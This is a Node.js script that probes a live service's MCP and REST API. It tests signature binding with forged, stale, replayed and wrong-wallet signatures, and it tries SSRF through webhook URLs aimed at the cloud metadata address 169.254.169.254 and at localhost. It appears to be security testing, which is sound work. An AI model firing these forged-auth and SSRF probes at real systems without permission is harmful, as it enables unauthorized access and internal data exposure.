// Probe 3: remote MCP auth binding + public tools + webhook validation + clean replay.
// Fresh local wallet. No tx sent, no funds. Run: node mcp-probe.mjs
import { createHash } from "crypto";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";

const BASE = "https://www.bull.family";
const acct = privateKeyToAccount(generatePrivateKey());
console.log("probe wallet:", acct.address);
const sha = (s) => createHash("sha256").update(s).digest("hex");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function mcp(method, params) {
  const res = await fetch(BASE + "/api/mcp", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
  });
  return res.json();
}
const txt = (r) => {
  try {
    return JSON.parse(r.result.content[0].text);
  } catch {
    return r;
  }
};

// M1: public tools
for (const [name, args] of [
  ["bull_info", {}],
  ["bull_stats", {}],
  ["bull_list_rfqs", {}],
  ["bull_get_deal", { dealId: "1" }],
  ["bull_get_receipt", { dealId: "1" }],
]) {
  const r = await mcp("tools/call", { name, arguments: args });
  console.log(`\nM1 ${name}:`, JSON.stringify(txt(r)).slice(0, 400));
  await sleep(1500);
}

// M2: signed tool -> signature_required challenge
const ch = await mcp("tools/call", {
  name: "bull_get_quotes",
  arguments: { rfqId: "4409e5c8a8e4", address: acct.address },
});
const chall = txt(ch);
console.log("\nM2 bull_get_quotes challenge:", JSON.stringify(chall).slice(0, 500));
const { message, timestamp } = chall;
console.log("challenge message lines:", JSON.stringify(String(message).split("\n")));
console.log("challenge timestamp:", timestamp, "now:", Date.now());

// M3: correct signature -> expect 403 (not the buyer) proving auth passed
const goodSig = await acct.signMessage({ message });
const m3 = await mcp("tools/call", {
  name: "bull_get_quotes",
  arguments: { rfqId: "4409e5c8a8e4", address: acct.address, timestamp, signature: goodSig },
});
console.log("\nM3 correct sig via MCP:", JSON.stringify(txt(m3)).slice(0, 300));
await sleep(2000);

// M4: WRONG-message signature — sign a POST /rfqs message with the SAME timestamp,
// submit as the answer to the bull_get_quotes challenge.
const forgedMsg = `Bull API\nPOST /api/v1/rfqs\n${timestamp}\n${sha("")}`;
const forgedSig = await acct.signMessage({ message: forgedMsg });
const m4 = await mcp("tools/call", {
  name: "bull_get_quotes",
  arguments: { rfqId: "4409e5c8a8e4", address: acct.address, timestamp, signature: forgedSig },
});
console.log("\nM4 forged sig (POST /rfqs msg, same ts) for bull_get_quotes:", JSON.stringify(txt(m4)).slice(0, 300));
await sleep(2000);

// M5: STALE challenge — sign the correct message text but with a 10-min-old timestamp
const staleTs = (Date.now() - 10 * 60 * 1000).toString();
const staleMsg = `Bull API\nGET /api/v1/rfqs/4409e5c8a8e4/quotes\n${staleTs}\n${sha("")}`;
const staleSig = await acct.signMessage({ message: staleMsg });
const m5 = await mcp("tools/call", {
  name: "bull_get_quotes",
  arguments: { rfqId: "4409e5c8a8e4", address: acct.address, timestamp: staleTs, signature: staleSig },
});
console.log("\nM5 stale ts (-10min) correct sig:", JSON.stringify(txt(m5)).slice(0, 300));
await sleep(2000);

// M6: signature from a DIFFERENT wallet than `address`
const other = privateKeyToAccount(generatePrivateKey());
const wrongSig = await other.signMessage({ message });
const m6 = await mcp("tools/call", {
  name: "bull_get_quotes",
  arguments: { rfqId: "4409e5c8a8e4", address: acct.address, timestamp, signature: wrongSig },
});
console.log("\nM6 sig from other wallet:", JSON.stringify(txt(m6)).slice(0, 300));

// ---- clean replay test on REST (spaced out to avoid the rate limiter) ----
async function signRest(method, path, ts, bodyRaw) {
  return acct.signMessage({ message: `Bull API\n${method} ${path}\n${ts}\n${sha(bodyRaw)}` });
}
async function restGet(path, ts, sig) {
  const res = await fetch(BASE + path, {
    headers: {
      "x-bull-address": acct.address,
      "x-bull-timestamp": ts,
      "x-bull-signature": sig,
    },
  });
  return { status: res.status, body: await res.json().catch(() => ({})) };
}
await sleep(4000);
const rts = Date.now().toString();
const rsig = await signRest("GET", "/api/v1/rfqs/4409e5c8a8e4/quotes", rts, "");
const r1 = await restGet("/api/v1/rfqs/4409e5c8a8e4/quotes", rts, rsig);
console.log("\nR1 GET quotes-list as stranger (1st):", r1.status, JSON.stringify(r1.body).slice(0, 200));
await sleep(6000);
const r2 = await restGet("/api/v1/rfqs/4409e5c8a8e4/quotes", rts, rsig);
console.log("R2 EXACT REPLAY same ts+sig (2nd, +6s):", r2.status, JSON.stringify(r2.body).slice(0, 200));

// ---- webhook URL validation via dryRun quote (no funds involved) ----
async function restPost(path, body, ts, sig) {
  const raw = JSON.stringify(body);
  const res = await fetch(BASE + path, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-bull-address": acct.address,
      "x-bull-timestamp": ts,
      "x-bull-signature": sig,
    },
    body: raw,
  });
  return { status: res.status, body: await res.json().catch(() => ({})) };
}
for (const [label, hook] of [
  ["W1 http + link-local", "http://169.254.169.254/latest/meta-data/"],
  ["W2 http + localhost", "http://localhost:8545/hook"],
  ["W3 https + public", "https://webhook.site/00000000-0000-0000-0000-000000000000"],
  ["W4 ftp scheme", "ftp://example.com/hook"],
]) {
  await sleep(3000);
  const b = { tokens: "1", price: "0.01", webhook: hook, dryRun: true };
  const t = Date.now().toString();
  const s = await signRest("POST", "/api/v1/rfqs/4409e5c8a8e4/quotes", t, JSON.stringify(b));
  const r = await restPost("/api/v1/rfqs/4409e5c8a8e4/quotes", b, t, s);
  console.log(`\n${label}: HTTP ${r.status} ${JSON.stringify(r.body).slice(0, 250)}`);
}
